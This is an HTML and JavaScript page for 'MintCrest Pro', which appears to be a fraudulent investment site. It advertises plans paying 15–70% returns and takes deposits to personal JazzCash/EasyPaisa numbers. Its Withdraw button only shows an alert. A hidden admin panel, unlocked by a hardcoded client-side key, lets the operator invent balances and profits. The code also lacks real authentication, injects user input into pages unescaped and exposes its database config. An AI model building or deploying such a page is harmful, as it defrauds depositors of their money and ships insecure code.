<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Pro | Secure Investing</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #020617; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.08); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .scroller::-webkit-scrollbar { display: none; }
        .page { display: none; animation: fadeIn 0.4s ease-in-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="h-full flex items-center justify-center p-6 bg-[#020617] z-[1000] absolute inset-0">
        <div class="glass w-full max-w-sm p-10 rounded-[3rem] text-center border-t-8 border-blue-600 shadow-2xl">
            <h1 class="text-3xl font-black italic tracking-tighter mb-2">MINTCREST</h1>
            <p class="text-gray-500 text-[10px] mb-10">Institutional Grade Server</p>
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl border border-white/10 outline-none text-center mb-4 font-bold">
            <button onclick="login()" class="w-full bg-blue-600 py-4 rounded-2xl font-bold shadow-xl">ENTER</button>
        </div>
    </section>

    <div id="app-ui" class="hidden flex-1 overflow-y-auto scroller pb-24">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 rounded-[2.5rem] mb-6 border-l-4 border-blue-500">
                <p class="text-[10px] text-gray-500 font-bold uppercase mb-1">Total Assets</p>
                <h2 class="text-5xl font-black tracking-tighter text-blue-500" id="v-bal">₨ 0</h2>
                <p class="text-[10px] mt-4 text-green-400 font-bold">Current Profit: <span id="v-profit">₨ 0</span></p>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-6 rounded-3xl text-center border-b-2 border-blue-500">
                    <span class="block text-xl">📥</span><span class="text-[10px] font-bold uppercase">Deposit</span>
                </button>
                <button onclick="alert('Sunday Withdrawal Only')" class="glass p-6 rounded-3xl text-center border-b-2 border-red-500">
                    <span class="block text-xl">📤</span><span class="text-[10px] font-bold uppercase">Withdraw</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-xl font-black mb-6 italic text-blue-500 uppercase">Growth Plans</h2>
            <div id="plans-list" class="space-y-4"></div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h2 class="text-xl font-black mb-6 italic text-center uppercase">Fund Portal</h2>
            <div class="glass p-6 rounded-[2rem] mb-6">
                <p class="text-[10px] text-gray-400 mb-4 text-center italic">Pay to JazzCash: 03705519562 / EasyPaisa: 03379827882</p>
                <input type="number" id="dep-amount" placeholder="Amount (Min 500)" class="w-full bg-white/5 p-4 rounded-xl mb-3 border border-white/10 outline-none">
                <input type="text" id="dep-trx" placeholder="Transaction ID / TID" class="w-full bg-white/5 p-4 rounded-xl mb-4 border border-white/10 outline-none">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-4 rounded-xl font-bold text-xs">SUBMIT DEPOSIT REQUEST</button>
            </div>
            <div class="glass p-4 rounded-xl text-[9px] text-gray-500">Requests are verified by admin within 1-6 hours.</div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[5000] p-6 hidden overflow-y-auto">
        <div class="max-w-2xl mx-auto">
            <div class="flex justify-between items-center mb-8">
                <h2 class="text-2xl font-black text-blue-500">MINTCREST CORE</h2>
                <button onclick="closeAdmin()" class="bg-red-600/20 text-red-500 px-4 py-2 rounded-lg text-xs font-bold">CLOSE</button>
            </div>

            <div class="mb-10">
                <h3 class="text-xs font-bold text-gray-500 mb-4 uppercase tracking-widest">Pending Deposits</h3>
                <div id="adm-req-list" class="space-y-3">
                    </div>
            </div>

            <div class="glass p-6 rounded-[2rem] border border-white/10">
                <h3 class="text-xs font-bold mb-4 uppercase">Direct Wallet Edit</h3>
                <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-3 rounded-lg mb-2 border border-white/5">
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-lg text-[10px] font-bold uppercase">Add Bal</button>
                    <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-lg text-[10px] font-bold uppercase">Add Profit</button>
                </div>
                <input type="number" id="adm-val" placeholder="Value" class="w-full bg-white/5 p-3 rounded-lg mt-2 border border-white/5">
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-4 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-1 active-tab">🏠<span class="text-[8px] font-bold uppercase">Home</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-1">📈<span class="text-[8px] font-bold uppercase">Invest</span></button>
        <button onclick="changePage('wallet')" id="n-wallet" class="flex flex-col items-center gap-1">💰<span class="text-[8px] font-bold uppercase">Fund</span></button>
    </nav>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg",
            authDomain: "investment-84f4e.firebaseapp.com",
            projectId: "investment-84f4e",
            storageBucket: "investment-84f4e.firebasestorage.app",
            messagingSenderId: "975293889308",
            appId: "1:975293889308:web:6d034a99cc966c75ff58d9"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        let user = null;
        const plans = [
            { n: "Starter Level", p: 500, r: "15%" },
            { n: "Bronze Silver", p: 1000, r: "20%" },
            { n: "Executive", p: 5000, r: "30%" },
            { n: "Gold VIP", p: 15000, r: "45%" },
            { n: "Diamond Master", p: 50000, r: "70%" }
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim();
            if(!name) return;
            const ref = db.collection("users").doc(name);
            const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0 });
            startSync(name);
            document.getElementById('auth-ui').style.display = 'none';
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                if(doc.exists) {
                    user = doc.data();
                    document.getElementById('v-bal').innerText = "₨ " + user.balance.toLocaleString();
                    document.getElementById('v-profit').innerText = "₨ " + user.profit.toLocaleString();
                }
            });
        }

        function renderPlans() {
            const list = document.getElementById('plans-list');
            list.innerHTML = '';
            plans.forEach(p => {
                list.innerHTML += `<div onclick="buy(${p.p})" class="glass p-6 rounded-[1.5rem] flex justify-between items-center border-b-2 border-blue-600">
                    <div><h4 class="font-bold text-sm">${p.n}</h4><p class="text-[9px] text-green-400">ROI: ${p.r}</p></div>
                    <p class="font-black text-blue-500">₨ ${p.p.toLocaleString()}</p>
                </div>`;
            });
        }

        async function submitDeposit() {
            const amt = document.getElementById('dep-amount').value;
            const trx = document.getElementById('dep-trx').value;
            if(amt < 500 || !trx) return alert("Min 500 & TID required!");
            
            await db.collection("deposits").add({
                user: user.name,
                amount: parseInt(amt),
                tid: trx,
                status: "pending",
                time: Date.now()
            });
            alert("Request Sent! Admin will verify soon.");
            changePage('home');
        }

        async function buy(price) {
            if(user.balance < price) { alert("Low balance!"); changePage('wallet'); }
            else { await db.collection("users").doc(user.name).update({ balance: user.balance - price }); alert("Activated!"); }
        }

        function changePage(p) {
            document.querySelectorAll('.page').forEach(page => page.classList.remove('active-page'));
            document.querySelectorAll('nav button').forEach(btn => btn.classList.remove('active-tab'));
            document.getElementById('p-' + p).classList.add('active-page');
            document.getElementById('n-' + p).classList.add('active-tab');
        }

        // --- ADMIN EXTRA FEATURES ---
        window.addEventListener('keydown', e => {
            if(e.ctrlKey && e.shiftKey && e.key === 'A') {
                if(prompt("Admin Key:") === "mint786") {
                    document.getElementById('admin-panel').classList.remove('hidden');
                    syncAdmin();
                }
            }
        });

        function syncAdmin() {
            db.collection("deposits").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-req-list');
                list.innerHTML = '';
                snap.forEach(doc => {
                    const d = doc.data();
                    list.innerHTML += `
                        <div class="glass p-4 rounded-xl flex justify-between items-center border-l-4 border-yellow-500">
                            <div class="text-[10px]">
                                <b class="block text-blue-400">${d.user}</b>
                                <span class="block">₨ ${d.amount} | TID: ${d.tid}</span>
                            </div>
                            <button onclick="approveDep('${doc.id}', '${d.user}', ${d.amount})" class="bg-green-600 px-3 py-1 rounded text-[9px] font-black uppercase">Approve</button>
                        </div>
                    `;
                });
            });
        }

        async function approveDep(docId, targetUser, amount) {
            const ref = db.collection("users").doc(targetUser);
            const userDoc = await ref.get();
            if(userDoc.exists) {
                await ref.update({ balance: (userDoc.data().balance || 0) + amount });
                await db.collection("deposits").doc(docId).delete();
                alert("Deposit Approved!");
            }
        }

        async function manualEdit(field) {
            const target = document.getElementById('adm-user').value;
            const val = document.getElementById('adm-val').value;
            const ref = db.collection("users").doc(target);
            const doc = await ref.get();
            if(doc.exists) {
                await ref.update({ [field]: (doc.data()[field] || 0) + parseInt(val) });
                alert("Updated!");
            }
        }

        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
